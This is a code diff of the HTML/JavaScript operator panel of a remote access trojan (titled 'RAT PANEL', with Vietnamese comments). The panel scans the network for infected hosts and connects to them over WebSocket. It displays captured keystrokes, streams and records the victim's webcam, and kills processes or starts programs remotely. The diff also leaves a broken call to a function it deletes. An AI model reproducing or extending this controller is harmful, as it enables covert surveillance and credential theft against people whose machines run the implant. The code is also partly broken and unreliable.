@@ -11,18 +11,17 @@
 
     <style>
         :root {
+            /* Palette Dark Mode cũ bạn thích */
             --bg-body: #1e1e20;
             --bg-panel: #2b2b2e;
             --bg-input: #38383b;
             --border-color: #444;
             --text-main: #e1e1e1;
             --text-muted: #b0b0b0;
-            --accent: #3b82f6;
-            --success: #10b981;
-            --danger: #ef4444;
+            --accent: #3b82f6;      
+            --success: #10b981;     
+            --danger: #ef4444;      
             --warning: #f59e0b;
-            --key-badge-bg: #3f3f46;
-            --key-badge-text: #67e8f9;
         }
 
         body {
@@ -56,87 +55,55 @@
             align-items: center;
         }
 
-        /* --- Terminal / List Views --- */
+        /* --- Terminal --- */
         .terminal {
             font-family: 'JetBrains Mono', monospace;
             background-color: #151517;
             border: 1px solid var(--border-color);
             border-radius: 4px;
-            padding: 10px;
+            padding: 8px;
             color: #d4d4d4;
-            font-size: 0.8rem; /* Font vừa phải, dễ đọc */
-            overflow-y: auto;
-            
-            /* Cố định chiều ngang, tự động xuống dòng */
-            white-space: pre-wrap;       /* Giữ định dạng xuống dòng, khoảng trắng */
-            word-wrap: break-word;       /* Bẻ từ dài xuống dòng */
-            overflow-x: hidden;          /* Ẩn thanh cuộn ngang */
-        }
-        
-        #process-list-output { 
-            height: 300px; 
-            color: #81a1c1; 
-            border-left: 2px solid var(--accent);
-        }
-        
-        #keylog-output { 
-            height: 220px; 
-            border-left: 2px solid var(--success);
-            line-height: 1.6; /* Tăng khoảng cách dòng cho thoáng */
-        }
-
-        /* --- [NEW] KEYLOGGER BADGE STYLING --- */
-        /* Style cho các phím đặc biệt nằm trong ngoặc [...] */
-        .key-badge {
-            display: inline-block;
-            background-color: var(--key-badge-bg);
-            color: var(--key-badge-text);
-            padding: 0px 6px;
-            border-radius: 4px;
-            border: 1px solid #52525b;
             font-size: 0.75rem;
-            font-weight: 600;
-            margin: 0 2px;
-            vertical-align: middle;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
         
-        /* Riêng phím ENTER cho nổi bật hơn */
-        .key-enter {
-            color: var(--warning);
-            border-color: var(--warning);
-            margin-bottom: 4px; /* Tạo khoảng cách khi xuống dòng */
-        }
+        #process-list-output { height: 300px; color: #81a1c1; border-left: 2px solid var(--accent); }
+        #keylog-output { height: 220px; color: #a3be8c; border-left: 2px solid var(--success); }
 
-        .process-item {
-            padding: 2px 0;
-            border-bottom: 1px solid #333;
-            display: flex;
-            justify-content: space-between;
-        }
+        .process-item { padding: 2px 0; border-bottom: 1px solid #333; display: flex; justify-content: space-between; }
         .process-name { font-weight: bold; color: #e1e1e1; }
         .process-pid { color: #888; }
 
-        /* --- Scrollbar --- */
-        .terminal::-webkit-scrollbar { width: 8px; }
-        .terminal::-webkit-scrollbar-track { background: #1e1e1e; border-radius: 4px; }
-        .terminal::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; border: 1px solid #1e1e1e; }
-
         /* --- Inputs & Buttons --- */
-        .form-control {
-            background-color: var(--bg-input); border: 1px solid var(--border-color); color: #fff; font-size: 0.85rem;
+        .form-control, .form-select {
+            background-color: var(--bg-input);
+            border: 1px solid var(--border-color);
+            color: #fff;
+            font-size: 0.85rem;
         }
-        .form-control:focus {
-            background-color: #454548; border-color: var(--accent); color: #fff; box-shadow: none;
+        .form-control:focus, .form-select:focus {
+            background-color: #454548;
+            border-color: var(--accent);
+            color: #fff;
+            box-shadow: none;
         }
         .form-control::placeholder { color: #888; opacity: 1; }
+
         .btn-sm { font-size: 0.75rem; padding: 0.3rem 0.6rem; }
         
         /* --- Media --- */
         .media-container {
-            background: #000; border: 1px solid var(--border-color); border-radius: 4px;
-            min-height: 240px; display: flex; align-items: center; justify-content: center;
-            overflow: hidden; margin-top: 10px;
+            background: #000;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            min-height: 240px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            margin-top: 10px;
         }
         #webcam-feed { width: 100%; object-fit: contain; }
 
@@ -149,6 +116,8 @@
             display: none; font-size: 0.85rem; font-weight: 500;
         }
         .label-text { font-size: 0.7rem; color: var(--text-muted); margin-bottom: 4px; display: block; font-weight: 600; }
+        
+        .scanning-spinner { display: none; }
     </style>
 </head>
 <body>
@@ -158,10 +127,19 @@
             <h6 class="m-0 text-white font-monospace"><i class="fas fa-terminal me-2 text-accent"></i>RAT PANEL</h6>
             
             <div class="d-flex align-items-center gap-2">
-                <div class="input-group input-group-sm" style="width: auto;">
-                    <input type="text" id="server-ip" class="form-control" value="{{ default_ip }}" placeholder="Target IP" onkeypress="handleEnter(event, 'connect')">
-                    <button class="btn btn-primary" onclick="connectManual()"><i class="fas fa-plug"></i></button>
-                </div>
+                <button class="btn btn-warning btn-sm fw-bold" onclick="scanNetwork()" id="btn-scan">
+                    <i class="fas fa-search"></i> SCAN
+                    <span class="spinner-border spinner-border-sm scanning-spinner" role="status"></span>
+                </button>
+
+                <select class="form-select form-select-sm" id="server-select" style="width: auto; min-width: 150px;">
+                    <option value="" selected>-- Target --</option>
+                    <option value="127.0.0.1">Localhost</option>
+                </select>
+                
+                <input type="text" id="manual-ip" class="form-control form-control-sm" placeholder="Or Type IP" style="width: 120px;" onkeypress="handleEnter(event, 'connect')">
+                
+                <button class="btn btn-primary btn-sm" onclick="connectFromSelection()"><i class="fas fa-plug"></i></button>
                 <span id="conn-status" class="badge bg-danger" style="font-size: 0.7rem;">OFFLINE</span>
             </div>
         </div>
@@ -276,18 +254,47 @@
             setTimeout(() => toastBox.style.display = 'none', 3000);
         }
 
-        // [MỚI] Hàm định dạng Keylog: Biến các chuỗi [...] thành Badge đẹp
-        function formatKeylogData(rawData) {
-            // Regex tìm tất cả các chuỗi nằm trong ngoặc vuông []
-            // Thay thế bằng HTML span với class "key-badge"
-            let formatted = rawData.replace(/\[(.*?)\]/g, function(match, content) {
-                // Nếu là [ENTER] thì thêm style đặc biệt
-                if (content.includes("ENTER")) {
-                    return `<span class="key-badge key-enter">${content}</span>`;
+        // --- [NEW] SCANNER LOGIC ---
+        async function scanNetwork() {
+            const btn = document.getElementById('btn-scan');
+            const spinner = document.querySelector('.scanning-spinner');
+            const select = document.getElementById('server-select');
+            
+            btn.disabled = true; spinner.style.display = 'inline-block';
+            showToast("Scanning Network...", "info");
+
+            try {
+                const response = await fetch('/api/scan');
+                const servers = await response.json();
+                
+                select.innerHTML = '<option value="">-- Select Target --</option><option value="127.0.0.1">Localhost</option>';
+                
+                if (servers.length > 0) {
+                    servers.forEach(srv => {
+                        const opt = document.createElement('option');
+                        opt.value = srv.ip;
+                        opt.text = `${srv.name} (${srv.ip})`;
+                        select.add(opt);
+                    });
+                    showToast(`Found ${servers.length} Servers!`, "success");
+                    select.selectedIndex = 2; // Auto select first found
+                } else {
+                    showToast("No servers found (check firewall).", "error");
                 }
-                return `<span class="key-badge">${content}</span>`;
-            });
-            return formatted;
+            } catch (e) {
+                console.error(e); showToast("Scan failed.", "error");
+            } finally {
+                btn.disabled = false; spinner.style.display = 'none';
+            }
+        }
+
+        function connectFromSelection() {
+            const selectIp = document.getElementById('server-select').value;
+            const manualIp = document.getElementById('manual-ip').value.trim();
+            const finalIp = manualIp || selectIp;
+
+            if (!finalIp) return showToast("Select or Type IP!", "error");
+            connectWebSocket(`ws://${finalIp}:9002`);
         }
 
         function downloadFile(b64, name, mime) {
@@ -297,20 +304,14 @@
 
         function handleEnter(e, action) {
             if(e.key === 'Enter') {
-                event.preventDefault();
+                e.preventDefault();
                 if(action === 'kill') killProcess();
                 else if(action === 'start') startApp();
-                else if(action === 'connect') connectManual();
+                else if(action === 'connect') connectFromSelection();
             }
         }
 
         // --- WEBSOCKET ---
-        function connectManual() {
-            const ip = document.getElementById('server-ip').value.trim();
-            if(!ip) return showToast("Nhập IP Target", "error");
-            connectWebSocket(`ws://${ip}:9002`);
-        }
-
         function connectWebSocket(url) {
             if(ws) ws.close();
             ws = new WebSocket(url);
@@ -318,7 +319,7 @@
             ws.onopen = () => {
                 document.getElementById('conn-status').textContent = 'CONNECTED';
                 document.getElementById('conn-status').className = 'badge bg-success';
-                showToast("Connected.", "success");
+                showToast("Connected to " + url, "success");
             };
             
             ws.onclose = () => {
@@ -349,30 +350,12 @@
                     showToast(data.msg, data.msg.includes("THẤT BẠI") ? "error" : "success");
                     if(data.msg.includes("Stopping") || data.msg.includes("dung Webcam")) updateWebcamUI(false);
                 }
-                
-                // [MỚI] Xử lý hiển thị Keylog thông minh
                 else if (data.type === 'KEYLOG_RESULT') {
                     const out = document.getElementById('keylog-output');
-                    const rawText = data.data;
-
-                    if (rawText) {
-                        // 1. Format đẹp (tạo badge)
-                        const niceHtml = formatKeylogData(rawText);
-                        
-                        // 2. Thêm vào khung (innerHTML để render thẻ span)
-                        out.innerHTML += niceHtml;
-
-                        // 3. Logic Smart Scroll (Sửa lỗi giật)
-                        // Chỉ tự cuộn nếu người dùng ĐANG ở dưới cùng
-                        const isScrolledToBottom = out.scrollHeight - out.clientHeight <= out.scrollTop + 50; // sai số 50px
-                        if (isScrolledToBottom) {
-                            out.scrollTop = out.scrollHeight;
-                        }
-                    }
-
+                    let clean = data.data.replace(/\[ENTER\]/g, '\n');
+                    out.innerHTML += clean; out.scrollTop = out.scrollHeight;
                     if(isKeylogging) sendCommand('GET_KEYLOG');
                 }
-                
                 else if (data.type === 'CAM_FRAME') {
                     document.getElementById('webcam-feed').src = 'data:image/jpeg;base64,' + data.data;
                     if(!isStreaming) updateWebcamUI(true);
@@ -390,28 +373,7 @@
             else showToast("No Connection", "error");
         }
 
-        // --- UI HELPERS ---
-        function updateWebcamUI(active) {
-            isStreaming = active;
-            const btn = document.getElementById('btn-stream');
-            const status = document.getElementById('stream-status');
-            const img = document.getElementById('webcam-feed');
-            const placeholder = document.getElementById('media-placeholder');
-
-            if(active) {
-                btn.className = 'btn btn-danger btn-sm w-100';
-                btn.innerHTML = '<i class="fas fa-stop"></i> Stop';
-                status.textContent = "LIVE"; status.className = "badge bg-danger blink";
-                img.style.display = 'block'; placeholder.style.display = 'none';
-            } else {
-                btn.className = 'btn btn-outline-success btn-sm w-100';
-                btn.innerHTML = '<i class="fas fa-video"></i> Stream';
-                status.textContent = "IDLE"; status.className = "badge bg-secondary";
-                img.style.display = 'none'; placeholder.style.display = 'block';
-                img.src = "";
-            }
-        }
-
+        // --- COMMANDS ---
         function killProcess() {
             const val = document.getElementById('pid-input').value.trim();
             if(val) { sendCommand('KILL_PROC', isNaN(val) ? {proc_name: val} : {pid: val}); document.getElementById('pid-input').value = ''; }
@@ -433,6 +395,27 @@
             else { sendCommand('STOP_CAM'); }
         }
 
+        function updateWebcamUI(active) {
+            isStreaming = active;
+            const btn = document.getElementById('btn-stream');
+            const status = document.getElementById('stream-status');
+            const img = document.getElementById('webcam-feed');
+            const placeholder = document.getElementById('media-placeholder');
+
+            if(active) {
+                btn.className = 'btn btn-danger btn-sm w-100';
+                btn.innerHTML = '<i class="fas fa-stop"></i> Stop';
+                status.textContent = "LIVE"; status.className = "badge bg-danger blink";
+                img.style.display = 'block'; placeholder.style.display = 'none';
+            } else {
+                btn.className = 'btn btn-outline-success btn-sm w-100';
+                btn.innerHTML = '<i class="fas fa-video"></i> Stream';
+                status.textContent = "IDLE"; status.className = "badge bg-secondary";
+                img.style.display = 'none'; placeholder.style.display = 'block';
+                img.src = "";
+            }
+        }
+
         function startRecord() {
             if(isStreaming) showToast("Stop Stream first!", "error");
             else { sendCommand('RECORD_CAM'); showToast("Recording...", "info"); }
@@ -442,6 +425,7 @@
             if(confirm("Terminate Remote Server?")) sendCommand('KILL_SERVER');
         }
 
+        // Auto connect
         connectManual();
     </script>
 </body>
